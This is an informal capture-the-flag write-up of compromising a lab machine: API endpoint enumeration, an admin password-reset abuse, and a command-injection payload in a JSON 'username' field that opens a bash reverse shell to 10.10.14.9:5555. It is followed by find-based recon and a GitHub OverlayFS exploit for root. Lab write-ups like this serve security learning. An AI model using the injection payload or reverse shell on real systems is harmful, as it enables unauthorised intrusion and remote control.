we looked all over and nothing to get a start on

but there was an invite code so we loked at js file adn we found an endpoint to post a request to get invite code

we logged in with new email and pass

now there was a link to generate openvpn , regenrate

we loked at burp for regenrate and found it was hitting api v1/auth/user/admin..

we went back one at a time v1/auth/user .. then v1/auth .. we hit soemthing which gave us all the endpoints

we loked at /admin/reset and we gave it the parameters and got our mail as admin

now there was another endpoint which help us generate /admin/openvpn

but no matter what we give it the username it generates .. so we execute a shell and got in

```
{
"username":"a$(bash -c 'bash -i >& /dev/tcp/10.10.14.9/5555 0>&1')"
}


content-tye: application/json
```

we ran

`find / -user username 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'`

to eleminate run,proc,sys from finding

and got a /var/mail it suggestedÂ  Overlay Exploit

we ran a github exploit with 2 terminals and got root

both using ssh not remote shell
